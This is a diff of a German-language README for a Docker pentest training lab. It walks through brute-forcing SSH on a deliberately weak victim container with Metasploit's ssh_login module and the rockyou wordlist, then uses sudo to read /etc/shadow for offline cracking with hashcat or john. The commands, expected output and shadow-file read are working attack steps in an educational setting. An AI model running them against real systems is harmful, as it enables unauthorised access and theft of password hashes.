@@ -20,7 +20,7 @@ eine Shell-Session oeffnet.
 │  Metasploit       │  ─── User+Pass-Listen ──▶ │  OpenSSH-Server   │
 │  + /wordlists     │                           │                   │
 │                   │   2. Treffer:             │  Accounts:        │
-│  Shell-Session    │ ◀─── admin:password123 ───│   admin  (sudo)   │
+│  Shell-Session    │ ◀─── admin:password1 ─────│   admin  (sudo)   │
 │  → sudo → root    │       mitarbeiter:hallo123│   mitarbeiter     │
 └──────────────────┘                          └──────────────────┘
                 Docker-Netz: lab (10.30.0.0/24)
@@ -54,45 +54,59 @@ nmap -sV 10.30.0.20
 
 ---
 
-### Schritt 2: Brute-Force vorbereiten
+### Schritt 2: Wortliste besorgen
+
+Wie im echten Pentest nutzen wir die **rockyou.txt** (14,3 Mio. geleakte Passwoerter). Sie wird
+**nicht** mitgeliefert (~133 MB) — einmalig holen:
+
+```sh
+./wordlists/get-rockyou.sh      # laedt rockyou.txt nach wordlists/ (oder nimmt Kalis lokale Kopie)
+```
+
+> **Schnelle Alternative ohne rockyou:** Es liegt eine winzige Demo-Liste
+> [wordlists/passwords.txt](wordlists/passwords.txt) bei. Dann ueberspringst du Schritt 2 und
+> ersetzt in Schritt 3 die Optionen durch:
+> ```
+> set USER_FILE /wordlists/users.txt
+> set PASS_FILE /wordlists/passwords.txt
+> set STOP_ON_SUCCESS false
+> ```
+> Das probiert mehrere User durch und findet in ~1 Min **beide** Accounts (`admin` + `mitarbeiter`).
+
+---
+
+### Schritt 3: Brute-Force vorbereiten & starten
 
 ```
 use auxiliary/scanner/ssh/ssh_login
 set RHOSTS 10.30.0.20
-set USER_FILE /wordlists/users.txt
-set PASS_FILE /wordlists/passwords.txt
-set STOP_ON_SUCCESS false
+set USERNAME admin
+set PASS_FILE /wordlists/rockyou.txt
+set STOP_ON_SUCCESS true
 set VERBOSE true
-```
-
-**Was passiert:**
-- `ssh_login` probiert jede Kombination aus Userliste und Passwortliste durch
-- `STOP_ON_SUCCESS false` = es sucht **alle** schwachen Accounts (nicht nur den ersten)
-- `VERBOSE true` = man sieht jeden Versuch live
-
----
-
-### Schritt 3: Angriff starten
-
-```
 run
 ```
 
-**Was passiert:** Bei jedem Treffer meldet Metasploit `[+] Success:` und oeffnet automatisch
-eine **Command-Shell-Session**.
+**Was passiert:**
+- `ssh_login` probiert die rockyou-Passwoerter **von oben nach unten** gegen den User `admin`
+- `STOP_ON_SUCCESS true` = stoppt beim ersten Treffer (sonst liefe es ewig weiter)
+- `VERBOSE true` = man sieht jeden Versuch live (das viele rote `[-] Failed:` gehoert dazu)
 
 **Erwartet:**
 ```
-[+] 10.30.0.20:22 - Success: 'admin:password123'
-[+] 10.30.0.20:22 - Success: 'mitarbeiter:hallo123'
-[*] SSH session 1 opened ...   (admin)
-[*] SSH session 2 opened ...   (mitarbeiter)
+[-] 10.30.0.20:22 - Failed: 'admin:123456'
+[-] 10.30.0.20:22 - Failed: 'admin:password'
+...
+[+] 10.30.0.20:22 - Success: 'admin:password1'
+[*] SSH session 1 opened ...
 ```
 
-> **Dauer:** Der Durchlauf aller Kombinationen dauert ~1–2 Minuten (jeder fehlgeschlagene
-> SSH-Login ist absichtlich verzoegert). Das viele rote `[-] Failed:` gehoert dazu — gut
-> sichtbar fuer die Demo. Wer es schneller will: `set STOP_ON_SUCCESS true` stoppt beim
-> ersten Treffer (dann nur `admin`).
+> **Warum funktioniert das so schnell?** `admin` hat mit `password1` ein **sehr** haeufiges
+> Passwort (rockyou-Zeile 28) → in ~1–2 Minuten gefunden. **Wichtige Lektion:** Live-SSH ist
+> langsam (jeder Fehlversuch ~2–3 s). Ein Passwort weit hinten in rockyou (z. B. `hallo123`,
+> Zeile 26054) wuerde online **Stunden** dauern — sowas knackt man **offline** gegen die
+> geklauten Hashes (siehe Schritt 5) mit `hashcat`/`john`. Genau deshalb ist das Abgreifen von
+> `/etc/shadow` der eigentliche Jackpot.
 
 Gefundene Zugangsdaten anzeigen:
 
@@ -134,7 +148,7 @@ Der `admin` ist in der `sudo`-Gruppe, und sein Passwort kennen wir bereits. Dami
 Passwort-Hashes **aller** User aus `/etc/shadow`:
 
 ```
-echo 'password123' | sudo -S cat /etc/shadow
+echo 'password1' | sudo -S cat /etc/shadow
 ```
 
 **Was passiert:** Ein einziges schwaches Passwort gibt uns ueber `sudo` **vollen Root-Zugriff**.
@@ -157,10 +171,13 @@ docker compose down -v
 
 ## Hinweise
 
-- Die schwachen Accounts (`admin:password123`, `mitarbeiter:hallo123`) sind im
+- Die schwachen Accounts (`admin:password1`, `mitarbeiter:hallo123`) sind im
   [victim/Dockerfile](victim/Dockerfile) bewusst angelegt; die Wortlisten liegen unter
   [wordlists/](wordlists/).
 - Szenario 3 nutzt ein eigenes Subnetz (`10.30.0.0/24`) und kollidiert daher nicht mit
   Szenario 1 (`10.10.0.0/24`) oder 2 (`10.20.0.0/24`).
-- In der Realitaet wuerde der Angreifer grosse Listen wie `rockyou.txt` nutzen; hier sind die
-  Listen bewusst klein gehalten, damit die Demo schnell laeuft.
+- `rockyou.txt` wird **nicht** eingecheckt (~133 MB, siehe [.gitignore](.gitignore)) — per
+  [wordlists/get-rockyou.sh](wordlists/get-rockyou.sh) holen. Die kleine
+  [wordlists/passwords.txt](wordlists/passwords.txt) liegt als schnelle Alternative bei.
+- Gegen Live-SSH probiert man rockyou nur **von oben** (haeufigste zuerst); tiefe Passwoerter
+  knackt man offline gegen die `/etc/shadow`-Hashes mit `hashcat`/`john` — nicht online.
